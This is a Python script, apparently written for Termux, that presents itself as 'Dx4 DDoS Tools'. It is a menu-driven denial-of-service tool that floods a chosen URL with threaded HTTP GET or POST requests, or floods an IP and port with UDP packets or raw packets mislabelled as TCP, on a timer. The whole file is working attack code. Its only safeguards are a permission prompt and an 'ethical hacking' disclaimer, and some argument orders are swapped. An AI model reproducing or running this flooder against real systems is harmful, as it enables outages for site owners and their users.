#!/data/data/com.termux/files/usr/bin/python

import datetime
import os
import sys
import threading
import time
import requests
import socket, socks, random
from colorama import Back, Fore, Style
import subprocess

logo = f"""
    {Fore.RED}███████╗ █████╗  █████╗ ███╗   ██╗ ██████╗ 
    ██╔════╝██╔══██╗██╔══██╗████╗  ██║██╔════╝ 
    █████╗  ███████║███████║██╔██╗ ██║██║  ███╗
    {Fore.RESET}██╔══╝  ██╔══██║██╔══██║██║╚██╗██║██║   ██║
    ██║     ██║  ██║██║  ██║██║ ╚████║╚██████╔╝
    ╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝ ╚═════╝    """
ipAddress = None

def Countdown(start_time, duration_seconds):
    start_time = float(start_time)
    while (time.time() - start_time) < duration_seconds:
        remaining_time = duration_seconds - (time.time() - start_time)
        time_formatted = "{:.1f}".format(remaining_time)
        sys.stdout.write("\r"+ Fore.MAGENTA+" [*] "+Fore.RESET+ "Attack Timer => {} second".format(time_formatted))
        sys.stdout.flush()
        time.sleep(0.1)
    print(f"\r{Fore.GREEN} [*] {Fore.RESET}Attack Done                   \n")

def get_public_ip():
    try:
        response = requests.get('https://api.ipify.org?format=json')
        if response.status_code == 200:
            data = response.json()
            return data['ip']
    except requests.exceptions.RequestException as e:
        print("Error:", e)

def get_provider(ip):
    try:
        response = requests.get(f'https://ipapi.co/{ip}/json/')
        if response.status_code == 200:
            data = response.json()
            return data['org']
    except requests.exceptions.RequestException as e:
        print("Error:", e)

# METHOD

def LaunchREQ(url, th, t, method):
    duration_seconds = int(t)
    until = datetime.datetime.now() + datetime.timedelta(seconds=duration_seconds)
    thread_count = int(th)
    for _ in range(thread_count):
        try:
            thd = threading.Thread(target=AttackREQ, args=(url, until, method))
            thd.start()
        except:
            pass

def AttackREQ(url, until_datetime, method):
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            if method.upper() == "1":
                requests.post(url)
                requests.post(url)
            elif method.upper() == "0":
                requests.get(url, timeout=15)
                requests.get(url, timeout=15)
            else:
                print(f"{Fore.RED} [*] {Fore.RESET}Attack method invalid")
                sys.exit()
        except:
            pass

#Layer4
def runflooder(host, port, th, t):
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    rand = random._urandom(4096)
    for _ in range(int(th)):
        try:
            thd = threading.Thread(target=flooder, args=(host, port, rand, until))
            thd.start()
        except:
            pass

def flooder(host, port, rand, until_datetime):
    sock = socket.socket(socket.AF_INET, socket.IPPROTO_IGMP)
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            sock.sendto(rand, (host, int(port)))
        except:
            sock.close()
            pass


def runsender(host, port, th, t, payload):
    if payload == "":
        payload = random._urandom(60000)
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    #payload = Payloads[method]
    for _ in range(int(th)):
        try:
            thd = threading.Thread(target=sender, args=(host, port, until, payload))
            thd.start()
        except:
            pass

def sender(host, port, until_datetime, payload):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            sock.sendto(payload, (host, int(port)))
        except:
            sock.close()
            pass

# View
def DdosRequests():
    # Contoh penggunaan
    target = input(Fore.MAGENTA+" [*] "+Fore.RESET+"Input Target Url : ")
    thread = input(Fore.MAGENTA+" [*] "+Fore.RESET+"Input Thread Count : ")
    t = input(Fore.MAGENTA+" [*] "+Fore.RESET+"Input Attack Timer : ")

    print(f"{Fore.MAGENTA} [*] {Fore.RESET}Attack Method\n{Fore.YELLOW}     [0] {Fore.RESET}GET (Method get source)\n{Fore.YELLOW}     [1] {Fore.RESET}POST (Method post form to target)")

    method = input(Fore.MAGENTA+" [*] "+Fore.RESET+"Input Attack Method : ")
    print(f"\n{Fore.RED} [*] {Fore.RESET}Make sure you have permission from the site owner")
    quest = input(Fore.RED+" [!] "+Fore.RESET+"Alert, Are you sure to attack (Y/N)? ")

    if "Y" in quest.upper():
        # Buat objek thread untuk LaunchREQ
        threading.Thread(target=LaunchREQ, args=(target, thread, t, method)).start()
        timer = threading.Thread(target=Countdown, args=(time.time(), float(t)))
        timer.start()
        timer.join()
    else:
        print(f"{Fore.RED} [*] {Fore.RESET}System Exit.")
        sys.exit()

def DdosUDP():
    target = input(Fore.MAGENTA+" [*] "+Fore.RESET+"Input IP Address : ")
    port = input(Fore.MAGENTA+" [*] "+Fore.RESET+"PORT : ")
    payload = input(Fore.MAGENTA+" [*] "+Fore.RESET+"Payload : ")
    thread = input(Fore.MAGENTA+" [*] "+Fore.RESET+"Input Thread Count : ")
    t = input(Fore.MAGENTA+" [*] "+Fore.RESET+"Input Attack Timer : ")
    
    print(f"\n{Fore.RED} [*] {Fore.RESET}Make sure you have permission from the site owner")
    quest = input(Fore.RED+" [!] "+Fore.RESET+"Alert, Are you sure to attack (Y/N)? ")

    if "Y" in quest.upper():
        threading.Thread(target=runsender, args=(target, port, t, thread, payload)).start()
        timer = threading.Thread(target=Countdown, args=(time.time(), float(t)))
        timer.start()
        timer.join()
    else:
        print(f"{Fore.RED} [*] {Fore.RESET}System Exit.")
        sys.exit()

def DdosTCP():
    target = input(Fore.MAGENTA+" [*] "+Fore.RESET+"Input IP Address : ")
    port = input(Fore.MAGENTA+" [*] "+Fore.RESET+"PORT : ")
    thread = input(Fore.MAGENTA+" [*] "+Fore.RESET+"Input Thread Count : ")
    t = input(Fore.MAGENTA+" [*] "+Fore.RESET+"Input Attack Timer : ")
    
    print(f"\n{Fore.RED} [*] {Fore.RESET}Make sure you have permission from the site owner")
    quest = input(Fore.RED+" [!] "+Fore.RESET+"Alert, Are you sure to attack (Y/N)? ")

    if "Y" in quest.upper():
        threading.Thread(target=runflooder, args=(target, port, t, thread)).start()
        timer = threading.Thread(target=Countdown, args=(time.time(), float(t)))
        timer.start()
        timer.join()
    else:
        print(f"{Fore.RED} [*] {Fore.RESET}System Exit.")
        sys.exit()

             
def CheckInternet():
    global ipAddress
    global provider
    print(Fore.MAGENTA + " [x] " + Fore.RESET + "Waiting for internet connection")
    ipAddress = get_public_ip()
    print(Fore.GREEN + " [x] " + Fore.RESET + "Internet access")
    time.sleep(0.7)

def StartTitle(nametools):
    global ipAddress
    if not check_text(ipAddress):
        CheckInternet()
    
    os.system("clear")
    print(logo)
    print(Fore.MAGENTA + " [~] " + Fore.RESET + nametools)
    print(Fore.MAGENTA + " [!] " + Fore.RESET + "Public IP : " + ipAddress)

def check_text(text):
    if text is None or text.strip() == "":
        return 0
    else:
        return 1
def DisplayMenu(menu_items):
    print("-" * 30)
    
    for index, item in enumerate(menu_items, start=1):
        print(f"    {Fore.BLUE}[{index}]{Fore.RESET} {item}")
    print("-" * 30)
    print(f"    {Fore.BLUE}[0]{Fore.RESET} Exit")
    print(f"    {Fore.BLUE}[999]{Fore.RESET} About Script")
    print("-" * 30)
#end

def start():
    StartTitle("Dx4 DDoS Tools")
    menu = [
        "REQ - For DDoS base website", 
        "UDP - layer4", 
        "TCP - layer4"
    ]
    DisplayMenu(menu)
    indexSelect = input(Fore.MAGENTA+" [?] "+Fore.RESET+"Select : ")
    if indexSelect.upper() == "999":
        StartTitle(f"About This Script") 
        print(Fore.MAGENTA + " [!] " + Fore.RESET + f"Script Creator : {Fore.RED}D{Fore.YELLOW}x{Fore.GREEN}4")
        print(Fore.MAGENTA + " [!] " + Fore.RESET + f"Support : F4Z")
        print(Fore.YELLOW+ " [Notes] " + Fore.RESET + f"This script was created for ethnical hacking purposes and is only for WebDev's benefit")
    elif indexSelect.upper() == "0":
        StartTitle(f"Exit") 
        sys.exit()
    elif indexSelect.upper() == "1":
        StartTitle(f"Requests DDoS")
        DdosRequests()
    elif indexSelect.upper() == "2":
        StartTitle(f"Layer4 {Back.MAGENTA}UDP{Back.RESET}")
        DdosUDP()
    elif indexSelect.upper() == "3":
        StartTitle(f"Layer4 {Back.MAGENTA}TCP{Back.RESET}")
        DdosTCP()
    else:
        print(f"{Fore.RED} [*] {Fore.RESET}Invalid menu")
        time.sleep(1) 
        start() 
        
if __name__ == '__main__':
    start()
